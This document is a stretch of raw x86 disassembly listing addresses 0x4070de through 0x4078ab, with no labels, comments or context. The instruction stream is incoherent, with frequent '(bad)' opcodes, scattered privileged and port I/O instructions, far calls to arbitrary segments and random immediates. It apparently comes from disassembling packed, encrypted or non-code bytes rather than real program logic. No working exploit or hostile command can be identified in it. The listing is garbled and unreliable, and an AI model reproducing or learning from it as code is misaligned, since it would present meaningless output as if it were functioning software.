  4070de:	pop    ecx
  4070df:	pop    es
  4070e0:	into   
  4070e1:	push   edi
  4070e2:	cdq    
  4070e3:	pop    esp
  4070e4:	mov    esp,ecx
  4070e6:	imul   si,WORD PTR [ebp+0x36],0xffce
  4070eb:	xor    edi,DWORD PTR [ebp-0x4adc07d]
  4070f1:	sub    edx,0xffffff87
  4070f4:	jnp    0x40710b
  4070f6:	outs   dx,DWORD PTR ds:[esi]
  4070f7:	imul   esp,DWORD PTR [eax+0xf3ccf06],0x21
  4070fe:	mov    ch,0x69
  407100:	inc    ecx
  407101:	mov    al,ds:0x352b2103
  407106:	and    ebp,0x53745704
  40710c:	jge    0x4070a6
  40710e:	test   BYTE PTR [eax+ecx*8-0x34bfc09],bl
  407115:	and    esp,0x70
  407118:	adc    DWORD PTR [ebx+0x33],eax
  40711b:	add    cl,al
  40711d:	retf   
  40711e:	and    dl,BYTE PTR [esi-0xd11285e]
  407124:	mov    es,WORD PTR [edx+0x41]
  407127:	gs jae 0x407190
  40712a:	add    DWORD PTR [ebx-0x67ec5853],ebp
  407130:	test   BYTE PTR [esi-0x72],ah
  407133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407134:	and    ebx,ebx
  407136:	cmp    bl,ah
  407138:	push   ecx
  407139:	adc    ecx,esp
  40713b:	add    bh,BYTE PTR [eax-0x35d5daa7]
  407141:	pop    esp
  407142:	ret    0x1a9c
  407145:	jno    0x407146
  407147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407148:	fcmove st,st(6)
  40714a:	and    esp,DWORD PTR [ebx+0x7f8379c4]
  407150:	int    0xb7
  407152:	pop    eax
  407153:	call   DWORD PTR [edx+0x43]
  407156:	dec    esi
  407157:	mov    al,0x71
  407159:	js     0x4071d9
  40715b:	(bad)  
  40715c:	ja     0x4071bb
  40715e:	pop    ss
  40715f:	push   ebx
  407160:	cdq    
  407161:	pop    eax
  407162:	jle    0x407156
  407164:	xchg   esp,eax
  407165:	out    dx,eax
  407166:	imul   ebp,DWORD PTR [edi-0x67],0xffffff94
  40716a:	test   BYTE PTR [ecx+0x12],0x62
  40716e:	test   al,0x49
  407170:	std    
  407171:	mov    BYTE PTR [edx],ch
  407173:	clc    
  407174:	das    
  407175:	xchg   BYTE PTR ds:0x66701227,al
  40717b:	inc    edi
  40717c:	pushf  
  40717d:	inc    DWORD PTR [esi-0x18]
  407180:	mov    al,0x73
  407182:	mov    ecx,esp
  407184:	inc    edx
  407185:	test   al,0xc
  407187:	inc    ecx
  407188:	in     eax,0xe0
  40718a:	into   
  40718b:	sub    BYTE PTR [ecx+0x3d5761a6],ah
  407191:	test   BYTE PTR [ebp-0x1],ch
  407194:	cmp    al,BYTE PTR [edx-0x9166716]
  40719a:	js     0x4071b6
  40719c:	nop
  40719d:	pop    eax
  40719e:	shr    DWORD PTR [ecx-0x7b],cl
  4071a1:	sub    dl,dl
  4071a3:	adc    dl,BYTE PTR [ebp+0x4c]
  4071a6:	ds sub eax,0xbab73bdf
  4071ac:	in     al,dx
  4071ad:	lea    ebp,[ecx]
  4071af:	jle    0x4071d1
  4071b1:	and    ecx,DWORD PTR ds:0x608e5c89
  4071b7:	mov    dh,0x46
  4071b9:	ss push ecx
  4071bb:	shr    eax,0x44
  4071be:	rep stos DWORD PTR es:[edi],eax
  4071c0:	mov    ch,0xf7
  4071c2:	mov    gs,WORD PTR [ecx]
  4071c4:	test   BYTE PTR [eax-0x24],ch
  4071c7:	pop    ecx
  4071c8:	call   FWORD PTR [edi-0x13]
  4071cb:	(bad)  
  4071cc:	adc    BYTE PTR [edx],cl
  4071ce:	xor    BYTE PTR [eax+0x75339418],ah
  4071d4:	int    0x73
  4071d6:	mov    edx,0x2b009871
  4071db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071dc:	ret    0x261c
  4071df:	cmp    eax,0xaa9cb2d0
  4071e4:	sub    eax,edi
  4071e6:	es pop es
  4071e8:	and    eax,0x9d094fa3
  4071ed:	in     eax,0xb0
  4071ef:	adc    eax,0x17200379
  4071f4:	mov    ebp,0x86b05433
  4071f9:	into   
  4071fa:	push   es
  4071fb:	fistp  WORD PTR [edi]
  4071fd:	sbb    BYTE PTR [eax-0x40],ah
  407200:	pop    ds
  407201:	jae    0x4071f3
  407203:	inc    ecx
  407204:	(bad)  
  407205:	out    dx,eax
  407206:	ds or  al,bl
  407209:	jp     0x407190
  40720b:	retf   0x8a55
  40720e:	scas   al,BYTE PTR es:[edi]
  40720f:	mov    ah,0x4b
  407211:	push   eax
  407212:	loop   0x407195
  407214:	pop    ecx
  407215:	aam    0x43
  407217:	icebp  
  407218:	jae    0x4071ee
  40721a:	or     al,0x6b
  40721c:	lea    ecx,[eax-0x5bdc088e]
  407222:	repnz call 0xf01c:0xf4cce280
  40722a:	test   BYTE PTR [edx+0x4],dl
  40722d:	lods   al,BYTE PTR ds:[esi]
  40722e:	add    eax,0x26d0fc55
  407233:	cmp    BYTE PTR [ebp*1-0x1f651f72],bl
  40723a:	stos   BYTE PTR es:[edi],al
  40723b:	or     eax,esi
  40723d:	adc    eax,0x39018a81
  407242:	jne    0x4072b1
  407244:	cmp    al,0x6d
  407246:	rcr    DWORD PTR [ebx+0x47],0xde
  40724a:	dec    esp
  40724b:	ins    DWORD PTR es:[edi],dx
  40724c:	add    al,0x6a
  40724e:	test   DWORD PTR [ebx-0x34],ecx
  407251:	jge    0x407286
  407253:	xor    DWORD PTR [edx],eax
  407255:	iret   
  407256:	pop    esp
  407257:	mov    esp,0xbf488263
  40725c:	aas    
  40725d:	psllq  mm1,QWORD PTR [ecx]
  407260:	and    BYTE PTR [edi+0xa3b0f34],al
  407266:	dec    esi
  407267:	xor    BYTE PTR [ebp+0x24],ah
  40726a:	or     bl,BYTE PTR [ebx+eiz*1-0x3d346bd2]
  407271:	pop    esp
  407272:	push   0xed18a3cd
  407277:	cmp    BYTE PTR [edi+0x3444edf7],bl
  40727d:	or     ch,al
  40727f:	(bad)  
  407280:	js     0x407223
  407282:	test   al,0x3
  407284:	sub    bh,BYTE PTR [ebx]
  407286:	inc    ebx
  407287:	adc    bl,BYTE PTR [edx-0x43]
  40728a:	repnz outs dx,DWORD PTR ds:[esi]
  40728c:	fadd   st(0),st
  40728e:	push   ebp
  40728f:	lahf   
  407290:	add    cl,BYTE PTR [ebp-0x3a]
  407293:	xor    dh,BYTE PTR [edi]
  407295:	add    al,0x61
  407297:	mov    bl,0xbe
  407299:	test   al,0x5a
  40729b:	aam    0xf1
  40729d:	cs inc ecx
  40729f:	push   esi
  4072a0:	hlt    
  4072a1:	ins    DWORD PTR es:[edi],dx
  4072a2:	jg     0x407261
  4072a4:	pop    ss
  4072a5:	aad    0x4a
  4072a7:	mov    dl,0xf5
  4072a9:	jp     0x407239
  4072ab:	call   0xc1610bfb
  4072b0:	fiadd  WORD PTR [edi-0x238887da]
  4072b6:	fild   WORD PTR [ebp-0x18c4afa8]
  4072bc:	and    bl,BYTE PTR [ebp+0x54]
  4072bf:	nop
  4072c0:	pop    esi
  4072c1:	xor    eax,0xb9c6c08e
  4072c6:	or     al,0x85
  4072c8:	js     0x4072aa
  4072ca:	call   0xd6288ce5
  4072cf:	ret    0x5fb2
  4072d2:	or     edx,DWORD PTR [esi+edi*1-0x6d]
  4072d6:	mov    ds:0xab269f65,eax
  4072db:	xchg   ebx,eax
  4072dc:	mov    ebx,0x252bb1de
  4072e1:	nop
  4072e2:	xchg   ebp,eax
  4072e3:	mov    WORD PTR [eax+eax*8-0x5a],fs
  4072e7:	jo     0x407308
  4072e9:	outs   dx,BYTE PTR ds:[esi]
  4072ea:	int    0x75
  4072ec:	je     0x4072d8
  4072ee:	push   ss
  4072ef:	sbb    al,0xa7
  4072f1:	in     eax,dx
  4072f2:	dec    ecx
  4072f3:	ja     0x4072f7
  4072f5:	push   cs
  4072f6:	in     al,dx
  4072f7:	std    
  4072f8:	cld    
  4072f9:	inc    ebx
  4072fa:	rcl    DWORD PTR [eax+0x50],1
  4072fd:	add    eax,DWORD PTR [ebp-0xc]
  407300:	in     eax,0xd8
  407302:	or     eax,0x9f4111cf
  407307:	nop
  407308:	or     al,ah
  40730a:	push   ecx
  40730b:	adc    DWORD PTR [ebx-0x2c],ebp
  40730e:	cmp    DWORD PTR [ebx-0x6f073f04],ecx
  407314:	aaa    
  407315:	cmp    edx,DWORD PTR [ebp+0x66]
  407318:	js     0x407347
  40731a:	test   al,0xb8
  40731c:	(bad)  
  40731e:	or     DWORD PTR [ebp+0x43],esi
  407321:	sbb    ebx,eax
  407323:	and    edi,edi
  407325:	jl     0x407304
  407327:	fdivr  DWORD PTR [ebp-0xbcb3412]
  40732d:	pop    es
  40732e:	push   0xffffffb7
  407330:	cdq    
  407331:	sti    
  407332:	cmp    eax,0x246d9993
  407337:	or     al,0x2e
  407339:	pop    esp
  40733a:	sti    
  40733b:	retf   0xaad5
  40733e:	sbb    al,BYTE PTR ds:0xc24a0147
  407344:	mov    ebp,0xe169e5f3
  407349:	(bad)  
  40734a:	sti    
  40734b:	iret   
  40734c:	push   eax
  40734d:	inc    ebx
  40734e:	sub    BYTE PTR [esi-0x3d1fdffe],cl
  407354:	xor    ebp,DWORD PTR [ebx]
  407356:	leave  
  407357:	jmp    0x9786a74
  40735c:	mov    eax,ds:0xe7b9a6cb
  407361:	mov    ah,0x85
  407363:	add    ah,BYTE PTR [eax-0x1a]
  407366:	pop    edi
  407367:	pop    ebx
  407368:	mov    al,ds:0xd078dcd7
  40736d:	sub    BYTE PTR [ecx+0x30],0xa3
  407371:	sbb    eax,0x4858a988
  407376:	sub    edi,DWORD PTR [edx+eiz*2-0x36efe5a9]
  40737d:	sub    ebx,DWORD PTR [ecx+eiz*8]
  407380:	mov    esp,0x21a0f4f0
  407385:	icebp  
  407386:	push   es
  407387:	and    dh,dh
  407389:	pop    esp
  40738a:	inc    edx
  40738b:	jnp    0x407352
  40738d:	(bad)  
  40738e:	pop    ecx
  40738f:	push   eax
  407390:	fs shl esi,1
  407393:	mov    ebp,0xd6b5b916
  407398:	clc    
  407399:	add    DWORD PTR [ebx-0x6c912759],ecx
  40739f:	retf   
  4073a0:	fsub   st(0),st
  4073a2:	dec    ebp
  4073a3:	add    al,0xcc
  4073a5:	adc    ecx,DWORD PTR [edx+eiz*4+0x48b9bfd3]
  4073ac:	mov    cl,0xc0
  4073ae:	dec    ecx
  4073af:	enter  0x1613,0x78
  4073b3:	jle    0x407363
  4073b5:	sbb    BYTE PTR [edx-0x3a1eb77b],al
  4073bb:	or     ebx,DWORD PTR [ecx+0x628ee804]
  4073c1:	pop    edi
  4073c2:	ret    0x3b42
  4073c5:	outs   dx,BYTE PTR ds:[esi]
  4073c6:	add    bh,BYTE PTR [ebp-0x6619981d]
  4073cc:	push   ebp
  4073cd:	outs   dx,BYTE PTR ds:[esi]
  4073ce:	lods   eax,DWORD PTR ds:[esi]
  4073cf:	dec    esp
  4073d0:	inc    esp
  4073d1:	loopne 0x40740d
  4073d3:	leave  
  4073d4:	sbb    eax,0xee971a76
  4073d9:	outs   dx,DWORD PTR ds:[esi]
  4073da:	in     al,0x16
  4073dc:	(bad)  
  4073dd:	fstp   st(7)
  4073df:	push   ecx
  4073e0:	das    
  4073e1:	call   0xe678e481
  4073e6:	jg     0x40737a
  4073e8:	into   
  4073e9:	loope  0x407413
  4073eb:	xor    DWORD PTR [eax],ebx
  4073ed:	ja     0x407399
  4073ef:	inc    esi
  4073f0:	inc    ebx
  4073f1:	mov    esp,0x1ba5084f
  4073f6:	jg     0x40739a
  4073f8:	dec    ebx
  4073f9:	aad    0xd3
  4073fb:	push   ss
  4073fc:	push   es
  4073fd:	pop    ebp
  4073fe:	push   ebp
  4073ff:	in     al,0x3c
  407401:	cdq    
  407402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407403:	bnd jmp 0x373dabea
  407409:	add    dh,BYTE PTR [edx+0x6602a068]
  40740f:	pop    es
  407410:	push   ebp
  407411:	cbw    
  407413:	pushf  
  407414:	dec    ecx
  407415:	jl     0x407411
  407417:	fst    QWORD PTR [edi+edx*1+0x3d]
  40741b:	mov    ds:0xbb049bad,al
  407420:	jae    0x4073af
  407422:	lahf   
  407423:	scas   eax,DWORD PTR es:[edi]
  407424:	add    al,0x1e
  407426:	addr16 pop edx
  407428:	xor    eax,0x876dcfe5
  40742d:	dec    eax
  40742e:	data16 into 
  407430:	ret    
  407431:	std    
  407432:	out    0x3a,al
  407434:	inc    ecx
  407435:	loope  0x4073c0
  407437:	inc    ecx
  407438:	mov    al,ds:0xf8eeffd5
  40743d:	pop    ebx
  40743e:	mov    esi,0x5fc2ebeb
  407443:	sub    dh,bh
  407445:	jns    0x40747d
  407447:	popf   
  407448:	fcomp  QWORD PTR [ebx-0x4]
  40744b:	add    BYTE PTR [edi],ah
  40744d:	mov    bl,0x42
  40744f:	xor    DWORD PTR [edi],edx
  407451:	jmp    esp
  407453:	(bad)  [eax+0x2e01e387]
  407459:	inc    ebx
  40745a:	pop    edi
  40745b:	or     BYTE PTR [esi],al
  40745d:	leave  
  40745e:	pop    eax
  40745f:	sahf   
  407460:	mov    bh,0x13
  407462:	pusha  
  407463:	or     eax,0x4b07c9
  407468:	out    0x10,al
  40746a:	inc    ecx
  40746b:	dec    esi
  40746c:	imul   eax,DWORD PTR [ebp-0x42],0x3b
  407470:	mov    eax,ds:0xf52c3d93
  407475:	test   eax,0x5de3ab06
  40747a:	(bad)  
  40747b:	mov    eax,ds:0x3f97c266
  407480:	(bad)  
  407481:	and    eax,0x1a2c597a
  407486:	loop   0x407424
  407488:	test   al,0x1c
  40748a:	pop    esi
  40748b:	add    BYTE PTR [ecx-0x8],ch
  40748e:	dec    esp
  40748f:	aad    0x10
  407491:	ret    0x1111
  407494:	fs ja  0x40746b
  407497:	inc    ebp
  407498:	fcmovnbe st,st(0)
  40749a:	push   0xe80b950e
  40749f:	dec    ecx
  4074a0:	push   ebx
  4074a1:	(bad)  
  4074a2:	loop   0x4074f0
  4074a4:	jnp    0x407492
  4074a6:	xchg   esi,eax
  4074a7:	dec    esi
  4074a8:	jno    0x4074c8
  4074aa:	scas   al,BYTE PTR es:[edi]
  4074ab:	daa    
  4074ac:	sahf   
  4074ad:	push   esi
  4074ae:	adc    al,0xf9
  4074b0:	imul   edx,ecx,0xf6eb00d4
  4074b6:	push   0xffffff89
  4074b8:	vpmacssww xmm13,xmm7,xmm1,XMMWORD PTR ds:0x756e8da1
  4074c2:	popf   
  4074c3:	or     al,0x42
  4074c5:	out    dx,eax
  4074c6:	mov    dl,0xf9
  4074c8:	das    
  4074c9:	push   ebx
  4074ca:	cmp    cl,BYTE PTR [esi]
  4074cc:	out    dx,al
  4074cd:	imul   eax,DWORD PTR [ebx],0x3c70e402
  4074d3:	out    dx,eax
  4074d4:	jo     0x4074d3
  4074d6:	arpl   WORD PTR cs:[edx+0x6788bc8f],di
  4074dd:	mov    al,BYTE PTR [esi]
  4074df:	inc    esi
  4074e0:	sbb    al,0x24
  4074e2:	mov    BYTE PTR [eax-0x6c74c1e0],dl
  4074e8:	mov    eax,0x97ef13ac
  4074ed:	sub    DWORD PTR [ebp-0x54],ecx
  4074f0:	cmp    DWORD PTR [ebp-0x38],edx
  4074f3:	hlt    
  4074f4:	mov    al,0xd7
  4074f6:	xor    DWORD PTR [esp+edi*4+0x2ebefd56],0xf22f1fb
  407501:	adc    edi,DWORD PTR [edx-0x7a3cef1d]
  407507:	shl    BYTE PTR [eax],1
  407509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40750a:	cmp    BYTE PTR [esi+0x68544d0b],cl
  407510:	ret    0x9794
  407513:	es jno 0x407506
  407516:	or     ecx,esi
  407518:	out    dx,al
  407519:	or     al,0x5
  40751b:	sub    al,0x70
  40751d:	pop    es
  40751e:	sub    bl,bh
  407520:	mov    ds:0xdf4b96f7,eax
  407525:	mov    BYTE PTR [ecx],0x15
  407528:	mov    dl,BYTE PTR cs:[edx+0x688ca59e]
  40752f:	retf   
  407530:	pop    ds
  407531:	mov    edx,ebp
  407533:	clc    
  407534:	xchg   edx,eax
  407535:	lods   eax,DWORD PTR ds:[esi]
  407536:	sub    DWORD PTR [ebx+0x470b3077],edi
  40753c:	rcr    DWORD PTR [ecx+0x1e],1
  40753f:	repnz pop edi
  407541:	aas    
  407542:	pop    es
  407543:	mov    ch,0xb6
  407545:	call   0xf8b7:0xef98cd64
  40754c:	(bad)  
  40754d:	cmp    BYTE PTR [edx+0x1a2971ff],dh
  407553:	mov    al,ds:0xe8871dd3
  407558:	(bad)  
  407559:	je     0x407573
  40755b:	push   ebx
  40755c:	dec    ebx
  40755d:	xor    edx,edx
  40755f:	add    eax,0x14db2b96
  407564:	call   0x9615:0x73eb916e
  40756b:	cmc    
  40756c:	enter  0x975,0x4a
  407570:	jle    0x407547
  407572:	jle    0x40752c
  407574:	add    BYTE PTR [ecx],ch
  407576:	pop    ebx
  407577:	test   al,0xd5
  407579:	and    eax,0x15d84428
  40757e:	xor    DWORD PTR ds:0xb9bff588,ebp
  407584:	jecxz  0x4075d6
  407586:	cmp    al,BYTE PTR [ecx+0x2a37b949]
  40758c:	hlt    
  40758d:	or     al,0x60
  40758f:	stos   BYTE PTR es:[edi],al
  407590:	mov    al,0x0
  407592:	cmc    
  407593:	pinsrw mm2,WORD PTR [esi+0x1e],0x6d
  407598:	test   DWORD PTR [esi-0x75cadc30],ebp
  40759e:	push   cs
  40759f:	adc    al,0xc1
  4075a1:	aas    
  4075a2:	dec    edi
  4075a3:	lods   eax,DWORD PTR ds:[esi]
  4075a4:	inc    edx
  4075a5:	cmp    BYTE PTR [esi+0x1b2b6e19],0xb1
  4075ac:	mov    ch,0x73
  4075ae:	xchg   esi,eax
  4075af:	out    0xaa,eax
  4075b1:	mov    esp,0x25645ccc
  4075b6:	xlat   BYTE PTR ds:[ebx]
  4075b7:	adc    bl,BYTE PTR [esi-0x3e]
  4075ba:	cmp    al,0x22
  4075bd:	push   cs
  4075be:	xor    ch,0x5f
  4075c1:	sbb    bh,BYTE PTR [ebp-0x3dd5c1b3]
  4075c7:	sub    ah,BYTE PTR [edi-0x33]
  4075ca:	xchg   ebp,eax
  4075cb:	cwde   
  4075cc:	scas   eax,DWORD PTR es:[edi]
  4075cd:	inc    ebp
  4075ce:	jecxz  0x40758a
  4075d0:	hlt    
  4075d1:	(bad)  
  4075d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075d3:	fild   DWORD PTR [ecx-0x7af1802f]
  4075d9:	(bad)  
  4075da:	repz add eax,0xd8ee83d9
  4075e0:	in     al,dx
  4075e1:	pop    ebx
  4075e2:	xchg   esp,eax
  4075e3:	out    dx,eax
  4075e4:	dec    esp
  4075e5:	outs   dx,BYTE PTR ds:[esi]
  4075e6:	jns    0x4075fe
  4075e8:	xchg   esi,eax
  4075e9:	inc    ecx
  4075ea:	retf   0x8e1c
  4075ed:	add    ebx,DWORD PTR [esi]
  4075ef:	sub    DWORD PTR [ecx-0x60cc0f87],ebp
  4075f5:	jmp    FWORD PTR [ecx-0x7e]
  4075f8:	mov    ?,WORD PTR [ecx-0x5113b36b]
  4075fe:	aaa    
  4075ff:	loope  0x4075f3
  407601:	lock pushf 
  407603:	dec    ebx
  407604:	int3   
  407605:	push   ds
  407606:	and    bh,ah
  407608:	int3   
  407609:	adc    dl,bl
  40760b:	and    DWORD PTR [edi+0x36],esi
  40760e:	ins    DWORD PTR es:[edi],dx
  40760f:	add    eax,0xa1d59bca
  407614:	add    esp,esp
  407616:	dec    ebx
  407617:	fstp   DWORD PTR [ebx]
  407619:	xchg   ebp,eax
  40761a:	and    ebp,DWORD PTR [ebx-0x20bbf48a]
  407620:	pop    edx
  407621:	adc    BYTE PTR [esi],dh
  407623:	fnstenv [edi-0x1c]
  407626:	push   0xffffff80
  407628:	jno    0x40762f
  40762a:	jg     0x40768e
  40762c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40762d:	xor    al,0x52
  40762f:	push   esp
  407630:	or     al,0x35
  407632:	push   esi
  407633:	sbb    DWORD PTR [ecx*8+0x19d3211d],eax
  40763a:	pop    ebx
  40763b:	add    DWORD PTR [eax-0x1df65035],edx
  407641:	mov    fs,WORD PTR [esi+0x518b948b]
  407647:	js     0x4076bb
  407649:	jmp    0xf8be:0xcd6f3ba7
  407650:	(bad)  [esp+edx*2-0x3]
  407654:	mov    ebx,ebp
  407656:	fxch   st(6)
  407658:	adc    ebx,0x82d81b94
  40765e:	mov    esp,eax
  407660:	sbb    al,0x6c
  407662:	jp     0x407601
  407664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407665:	inc    ebp
  407666:	or     al,BYTE PTR [edi+edi*1-0x4ecb27e9]
  40766d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40766e:	call   0x55bd32f1
  407673:	mov    BYTE PTR [edi+ebp*2],0x96
  407677:	out    dx,al
  407678:	hlt    
  407679:	lahf   
  40767a:	mov    dl,0x22
  40767c:	mov    edi,0xe5122f3f
  407681:	test   DWORD PTR ss:[esi-0x3476fcc8],ebx
  407688:	dec    ebp
  407689:	test   eax,0x46006313
  40768e:	shr    DWORD PTR [eax+0x4d167d19],cl
  407694:	cmovg  ebp,DWORD PTR [eax-0x512a86a2]
  40769b:	in     al,dx
  40769c:	inc    esp
  40769d:	repnz aad 0x6f
  4076a0:	iret   
  4076a1:	jo     0x4076c6
  4076a3:	push   esi
  4076a4:	xor    DWORD PTR [edi+eiz*4+0x72],esp
  4076a8:	into   
  4076a9:	ins    DWORD PTR es:[edi],dx
  4076aa:	inc    edi
  4076ab:	pop    ecx
  4076ac:	sub    DWORD PTR [edx],esp
  4076ae:	inc    edx
  4076af:	out    dx,eax
  4076b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076b1:	push   esi
  4076b2:	(bad)  
  4076b3:	int    0x10
  4076b5:	pop    ss
  4076b6:	and    eax,0x9e79486d
  4076bb:	add    al,0x5f
  4076bd:	and    al,0x1e
  4076bf:	sti    
  4076c0:	hlt    
  4076c1:	xchg   ebx,eax
  4076c2:	mov    cs,WORD PTR [eax]
  4076c4:	sub    al,0x4
  4076c6:	pop    edi
  4076c7:	jge    0x4076bf
  4076c9:	lahf   
  4076ca:	addr16 push edx
  4076cc:	fimul  WORD PTR [edx-0x4]
  4076cf:	add    al,0xc9
  4076d1:	xor    BYTE PTR [edi-0x60],bh
  4076d4:	push   esi
  4076d5:	mov    ds:0x8c1ad0b5,eax
  4076da:	mov    ds:0x11048490,al
  4076df:	inc    edi
  4076e0:	je     0x40767a
  4076e2:	mov    esp,0xd83be3a
  4076e7:	and    cl,BYTE PTR [ebp-0xd]
  4076ea:	push   es
  4076eb:	push   ss
  4076ec:	or     esp,DWORD PTR [ecx+0x7e1f55ae]
  4076f2:	pop    edx
  4076f3:	lock jno 0x40776c
  4076f6:	in     eax,0xbc
  4076f8:	and    eax,0x9db10135
  4076fd:	mov    dl,0xe3
  4076ff:	retf   
  407700:	and    BYTE PTR [ecx+0x702f0a96],dl
  407706:	pop    ds
  407707:	(bad)  
  407708:	idiv   DWORD PTR [eax-0x3]
  40770b:	inc    edx
  40770c:	dec    edx
  40770d:	push   es
  40770e:	push   ds
  40770f:	outs   dx,DWORD PTR ds:[esi]
  407710:	sbb    al,BYTE PTR ds:0x7179ff33
  407716:	out    dx,al
  407717:	dec    edi
  407718:	nop
  407719:	inc    ebx
  40771a:	jg     0x4076ae
  40771c:	daa    
  40771d:	dec    esi
  40771e:	mov    ch,0x57
  407720:	gs dec esi
  407722:	shl    BYTE PTR [ebx+eiz*2],cl
  407725:	pop    ebx
  407726:	ins    DWORD PTR es:[edi],dx
  407727:	cmp    BYTE PTR [edx],dh
  407729:	daa    
  40772a:	fsub   DWORD PTR [esi+0x24cfa98e]
  407730:	lea    esp,[edi+0x78]
  407733:	mov    ecx,0x5de897a
  407738:	cld    
  407739:	stc    
  40773a:	xchg   ecx,eax
  40773b:	int3   
  40773c:	mov    ebx,0x13a73e5f
  407741:	cwde   
  407742:	dec    ebx
  407743:	push   ecx
  407744:	(bad)  
  407745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407746:	out    0x9e,eax
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    ch,0xd5
  40774c:	mov    cl,0xbf
  40774e:	pcmpgtb mm1,QWORD PTR [ebx]
  407751:	and    dl,ah
  407753:	js     0x4076d6
  407755:	in     eax,0xd5
  407757:	(bad)  
  407758:	xchg   esp,eax
  407759:	ja     0x40774b
  40775b:	fcom   QWORD PTR [esi+0x28]
  40775e:	repz (bad) 
  407760:	jp     0x4077cf
  407762:	adc    ch,dh
  407764:	inc    esp
  407765:	imul   edi,DWORD PTR [edi],0x7b1e0e69
  40776b:	je     0x407797
  40776d:	and    edi,ebp
  40776f:	out    0xc1,eax
  407771:	das    
  407772:	loop   0x4076f5
  407774:	nop
  407775:	loopne 0x4077dc
  407777:	outs   dx,DWORD PTR ds:[esi]
  407778:	mov    ecx,0xb2f77da8
  40777d:	mov    DWORD PTR ds:0x5d60ffff,esi
  407783:	outs   dx,DWORD PTR ds:[esi]
  407784:	pop    esi
  407785:	add    eax,0xfa33a8a2
  40778a:	dec    ebp
  40778b:	pop    ecx
  40778c:	sbb    BYTE PTR [ebx+0x180b1c1b],dh
  407792:	frstor [esi]
  407794:	pop    esi
  407795:	mov    ch,0x3f
  407797:	sar    BYTE PTR [edx],0x3a
  40779a:	pusha  
  40779b:	add    eax,0x277741bd
  4077a0:	mov    esp,0x9fe4d666
  4077a5:	inc    eax
  4077a6:	aaa    
  4077a7:	arpl   WORD PTR [esi+0x146781f1],bp
  4077ad:	ror    bl,cl
  4077af:	dec    edi
  4077b0:	mov    al,0x3
  4077b2:	sbb    dl,ah
  4077b4:	hlt    
  4077b5:	xchg   esp,eax
  4077b6:	stos   DWORD PTR es:[edi],eax
  4077b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077b8:	or     bl,BYTE PTR [edx]
  4077ba:	pop    ds
  4077bb:	sti    
  4077bc:	push   ebp
  4077bd:	(bad)  
  4077bf:	loop   0x407760
  4077c1:	pushf  
  4077c2:	jo     0x407786
  4077c4:	inc    esi
  4077c5:	mov    al,ds:0xad835662
  4077ca:	lahf   
  4077cb:	push   ecx
  4077cc:	dec    DWORD PTR [ecx+0x6e]
  4077cf:	(bad)  
  4077d0:	fsub   DWORD PTR [ebx]
  4077d2:	inc    esi
  4077d3:	jp     0x4077ec
  4077d5:	mov    bh,0xea
  4077d7:	ins    DWORD PTR es:[edi],dx
  4077d8:	leave  
  4077d9:	loopne 0x4077c5
  4077db:	rcl    DWORD PTR [edx+0x1ee863d1],1
  4077e1:	xchg   BYTE PTR [esi+0x408bb92d],bl
  4077e7:	adc    al,0x90
  4077e9:	cld    
  4077ea:	push   0xd
  4077ec:	imul   ebx,DWORD PTR [ecx+0x2c1ecdd6],0x3c787e15
  4077f6:	inc    edx
  4077f7:	fdiv   DWORD PTR [ecx+0x1b]
  4077fa:	dec    eax
  4077fb:	in     eax,dx
  4077fc:	xchg   esp,eax
  4077fd:	add    al,dl
  4077ff:	push   cs
  407800:	(bad)  
  407802:	repz mov dl,0xef
  407805:	outs   dx,BYTE PTR ds:[esi]
  407806:	shl    DWORD PTR [ecx],cl
  407808:	mov    bl,0x2a
  40780a:	jmp    0xc375:0x5bd3b16a
  407811:	out    0x7f,al
  407813:	dec    esi
  407814:	cld    
  407815:	mov    BYTE PTR [eax],0x6c
  407818:	sti    
  407819:	dec    esi
  40781a:	shl    DWORD PTR [ebx-0x4],1
  40781d:	in     eax,0x55
  40781f:	and    ebx,ebx
  407821:	sar    DWORD PTR [esi-0x3fc0e25],0xfb
  407828:	data16 stos BYTE PTR es:[edi],al
  40782a:	mov    WORD PTR [ecx],gs
  40782c:	xchg   ebx,edx
  40782e:	xchg   ebx,eax
  40782f:	push   cs
  407830:	fwait
  407831:	mov    ds:0x20047030,al
  407836:	add    eax,0x2e876416
  40783b:	shl    BYTE PTR [edi],cl
  40783d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40783e:	fst    DWORD PTR [eax]
  407840:	fwait
  407841:	jle    0x407879
  407843:	add    ecx,0xd87f5645
  407849:	in     eax,dx
  40784a:	adc    edx,DWORD PTR [ebp-0x14]
  40784d:	fisubr DWORD PTR ds:0xa3eca55a
  407853:	dec    edi
  407854:	std    
  407855:	adc    al,BYTE PTR [eax+0x521b8c8b]
  40785b:	ror    BYTE PTR [ecx+0x734ce848],0x44
  407862:	in     al,0x66
  407864:	nop
  407865:	push   es
  407866:	loop   0x407886
  407868:	call   0x8ed45145
  40786d:	xchg   edi,eax
  40786e:	and    eax,DWORD PTR ds:0x609240f6
  407874:	rcr    ebp,1
  407876:	mov    eax,ds:0xb121fc4
  40787b:	and    edx,DWORD PTR [edx]
  40787d:	loopne 0x40788a
  40787f:	and    esi,edx
  407881:	aaa    
  407882:	(bad)  
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	call   0xaef6:0x867b6897
  40788b:	and    ecx,DWORD PTR [esp+ebp*4]
  40788e:	leave  
  40788f:	in     eax,0x9
  407891:	retf   0x9e6
  407894:	in     eax,dx
  407895:	jmp    0x294b:0x8c5e44d9
  40789c:	stc    
  40789d:	pop    edi
  40789e:	inc    esp
  40789f:	jo     0x4078a5
  4078a1:	(bad)  
  4078a2:	ins    BYTE PTR es:[edi],dx
  4078a3:	add    ecx,esi
  4078a5:	test   eax,0x5d86be71
  4078aa:	push   ecx
  4078ab:	adc    al,BYTE PTR [edi-0xba1445a]
